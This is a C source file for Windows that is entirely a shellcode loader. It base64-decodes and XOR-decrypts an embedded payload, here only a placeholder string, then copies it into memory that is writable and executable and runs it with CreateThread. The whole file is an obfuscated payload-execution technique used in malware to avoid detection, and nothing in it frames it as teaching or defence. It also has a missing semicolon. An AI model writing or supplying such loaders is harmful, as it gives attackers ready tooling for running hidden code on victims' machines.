#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <windows.h>

void xor_decrypt(unsigned char* data, int length, unsigned char key) {
    for (int i = 0; i < length; i++) {
        data[i] ^= key;
    }
}

void base64_decode(const unsigned char* encoded_data, unsigned char* decoded_data, size_t encoded_length) {
    static const unsigned char decoding_table[] = {
        64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
        64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 62, 64, 62, 64, 63,
        52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 64, 64, 64, 64, 64, 64, 64, 0, 1, 2, 3, 4, 5, 6, 7, 8,
        9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 64, 64, 64, 64, 63, 64, 26,
        27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50,
        51, 64, 64, 64, 64, 64
    };

    for (size_t i = 0, j = 0; i < encoded_length;) {
        uint32_t sextet_a = encoded_data[i] == '=' ? 0 & i++ : decoding_table[encoded_data[i++]];
        uint32_t sextet_b = encoded_data[i] == '=' ? 0 & i++ : decoding_table[encoded_data[i++]];
        uint32_t sextet_c = encoded_data[i] == '=' ? 0 & i++ : decoding_table[encoded_data[i++]];
        uint32_t sextet_d = encoded_data[i] == '=' ? 0 & i++ : decoding_table[encoded_data[i++]];

        uint32_t triple = (sextet_a << 18) | (sextet_b << 12) | (sextet_c << 6) | sextet_d;

        if (j < encoded_length) decoded_data[j++] = (triple >> 16) & 0xFF;
        if (j < encoded_length) decoded_data[j++] = (triple >> 8) & 0xFF;
        if (j < encoded_length) decoded_data[j++] = triple & 0xFF;
    }
}

int main() {
    unsigned char encoded_shellcode[] = "..shelcode.."
    size_t encoded_length = strlen((char*)encoded_shellcode);
    size_t decoded_length = 3 * (encoded_length / 4);  // approximate decoded size

    unsigned char decoded_shellcode[decoded_length];
    base64_decode(encoded_shellcode, decoded_shellcode, encoded_length);
    unsigned char key = 0xAA;
    xor_decrypt(decoded_shellcode, decoded_length, key);

    LPVOID allocated_mem = VirtualAlloc(NULL, decoded_length, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    if (allocated_mem == NULL) {
        printf("Failed to allocate memory: %d\n", GetLastError());
        return 1;
    } else { printf("Memory Allocated at address: 0x%p\n", allocated_mem); }
  
    RtlCopyMemory(allocated_mem, decoded_shellcode, decoded_length);
    printf("Shellcode written\n");

    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)allocated_mem, NULL, 0, NULL);
    if (hThread == NULL) {
        printf("Failed to create thread: %d\n", GetLastError());
        return 1;
    } else { printf("Thread created\n"); }
  
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFree(allocated_mem, 0, MEM_RELEASE);
    return 0;
}
